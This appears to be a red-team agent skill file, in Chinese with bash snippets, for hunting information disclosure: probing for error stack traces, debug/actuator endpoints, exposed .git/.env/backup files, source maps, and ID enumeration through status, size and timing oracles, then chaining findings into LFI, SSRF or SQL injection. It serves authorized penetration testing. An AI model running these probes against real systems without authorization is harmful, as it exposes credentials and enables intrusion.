---
name: hunt-information-disclosure
description: 狩猎错误信息泄露、DVCS 暴露、source map、配置文件以及差异化预言机。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3, httpx
metadata:
  tags: [redteam, information-disclosure, error-leakage, source-maps, config, enumeration]
  category: redteam
  related_skills:
    - source-leak-hunt
    - js-secrets-extraction
    - error-log-mining
    - source-leak-hunt
---

# 信息泄露狩猎

狩猎通过堆栈跟踪、调试端点、版本化路径发现、source map 和差异化预言机暴露的信息。每一次泄露都会放大其他漏洞 — 一个版本号可以用于 CVE 定向利用，一个服务器路径可以用于 LFI，一个 schema 泄露可以用于绕过认证，而一条错误消息则揭示了内部基础设施。

## When to Use

- 应用返回带有堆栈跟踪、文件路径或 SQL 片段的详细错误消息。
- 生产环境部署了 source map（.js.map）。
- 版本化的静态资源泄露框架/CMS 版本。
- API 响应因对象是否存在而不同（通过状态码/长度/时间进行用户枚举）。
- 调试端点、健康检查或状态页暴露内部状态。

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`curl`、`jq`。
- 可写证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何会改变状态的步骤（写入、上传、凭据尝试），在命令执行前立即获得明确确认。

## How to Run

```bash
# Trigger errors on common paths
for path in "/nonexistent" "/%00" "/.." "/error" "/debug"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com$path" | grep -iE "stack|trace|exception|error|warning|debug|line [0-9]+" | head -5
done
```

## 快速检测

```bash
# Trigger errors on common paths
for path in "/nonexistent" "/%00" "/.." "/error" "/debug"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com$path" | grep -iE "stack|trace|exception|error|warning|debug|line [0-9]+" | head -5
done
```

## Procedure

### 阶段 1 — 错误与异常泄露

```bash
# Trigger errors with malformed input
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users?id='"
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/login" -d '{"username":null}'
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/search?q=%00"

# Check response for sensitive data
# Stack traces → file paths, line numbers, framework version
# SQL errors → table names, column names, DB type
# Deserialization errors → class names, serialization format
# Template errors → template paths, engine type

# Fuzz for debug endpoints
for path in "/debug" "/__debug__" "/debugbar" "/_debug_toolbar" "/.well-known/debug" \
            "/actuator" "/actuator/info" "/actuator/env" "/actuator/health"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com$path" -w "\n%{http_code} — $path\n" -o /dev/null
done
```

### 阶段 2 — DVCS 与配置文件发现

```bash
# Git, SVN, Mercurial exposure
for path in "/.git/HEAD" "/.git/config" "/.svn/entries" "/.hg/store/"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com$path" -w "%{http_code} — $path\n" -o /dev/null
done

# Config and env files
for pattern in ".env" ".env.local" ".env.production" ".env.staging" \
               "config.json" "config.yml" "settings.py" "settings.php" \
               "wp-config.php" "web.config" "app.config"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/$pattern" -w "%{http_code} — $pattern\n" -o /dev/null
done

# Backup files
for pattern in "backup.zip" "backup.sql" "dump.sql" "db.sql" \
               "database.sql" "export.sql" "site.tar.gz" "backup.tar.gz"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/$pattern" -w "%{http_code} — $pattern\n" -o /dev/null
done
```

### 阶段 3 — Source Map 利用

```bash
# Find .js.map files
curl --max-time 30 --connect-timeout 10 -sk "https://target.com" | grep -Po '[^"\s]+\.js\.map' | sort -u

# Download and extract
wget "https://target.com/static/app.js.map"
node -e "
const m=require('./app.js.map');
m.sources.forEach((s,i)=>require('fs').writeFileSync(s.split('/').pop(),m.sourcesContent[i]));
console.log('Extracted '+m.sources.length+' files');
"

# Look for NEXT_PUBLIC env vars in extracted source
grep -r "NEXT_PUBLIC_" extracted_files/ | cut -d= -f1 | sort -u
```

### 阶段 4 — 差异化预言机

```bash
# User enumeration via status code
for id in {1..50}; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users/$id" -w "$id — %{http_code}\n" -o /dev/null
done

# Object existence via response size
for id in {1..100}; do
  size=$(curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/orders/$id" -w "%{size_download}" -o /dev/null)
  echo "$id — $size bytes"
done | awk '$2 > 100 {print "EXISTS: "$0}'

# Timing oracle for blind enumeration
for id in {1..50}; do
  time curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users/$id" -o /dev/null -w "%{time_total}s $id\n"
done | sort -rn

# ETag/304 oracle
for id in {1..10}; do
  etag=$(curl --max-time 30 --connect-timeout 10 -skI "https://target.com/api/users/$id" | grep -i etag)
  echo "$id: $etag"
done
```

### 阶段 5 — 版本与技术栈发现

```bash
# Framework version from static assets
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/static/admin/css/base.css" | head -5
curl --max-time 30 --connect-timeout 10 -sk "https://target.com" | grep -Po '(?:Django|Laravel|Rails|Express|Next\.js|Nuxt)[\s/]*v?[0-9.]+'

# Package manager lock files
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/composer.lock" | jq -r '.packages[] | select(.version) | "\(.name)@\(.version)"' 2>/dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/package-lock.json" | jq -r '.packages | to_entries[] | "\(.key)@\(.value.version)"' 2>/dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/yarn.lock" | head -30
```

### 阶段 6 — 串联泄露信息

每种泄露类型都为其他攻击向量提供输入：

| 泄露内容 | 可串联至 |
|---|---|
| 框架版本 | CVE 数据库查询 |
| 服务器路径 | LFI 路径穿越 |
| 内部 IP | SSRF 目标 |
| API schema | 通过未文档化端点绕过认证 |
| 依赖版本 | 供应链漏洞 |
| NEXT_PUBLIC 变量 | API 密钥/Supabase/Firebase 访问 |
| SQL 错误 | SQL 注入确认 + 数据库类型 |

## Pitfalls

- **并非每条错误消息都可被利用。** 一条没有细节的通用“发生错误”页面不构成发现。
- **Source map 可能为空或被剥离。** 报告前先验证提取出的内容。
- **差异化预言机是统计性的。** 报告前至少用 3 个样本确认。
- **`.git` 暴露必须包含真实的仓库数据，而不只是路径返回 HTTP 200。** 一个 catch-all 的 SPA 可能对 `/.git/HEAD` 返回 200，却并不提供 git 数据。
- **仅版本泄露通常为 LOW 严重性。** 将其串联起来 — 版本 → CVE → 利用。

## Verification

1. 错误消息包含可操作的内部数据（文件路径、SQL 查询、框架版本）。
2. Source map 提取产出带有可识别代码的真实源文件（而不是仅 webpack 引导代码）。
3. 差异化预言机能一致地分辨存在与不存在的资源。
4. 报告前将该泄露串联到另一个漏洞 — 独立的信息泄露很少是严重的。
5. 对于配置文件：泄露的数据必须包含凭据、API 密钥或连接字符串（而不只是通用配置）。

---

## 相关技能

- **`source-leak-hunt`** — 专注于 `.env`、`.git` 和配置文件泄露。
- **`js-secrets-extraction`** — JavaScript bundle 中的 API 密钥和令牌。
- **`error-log-mining`** — 带有凭据和查询泄露的 PHP 错误日志。
- **`source-leak-hunt`** — 揭示敏感端点的路径发现。
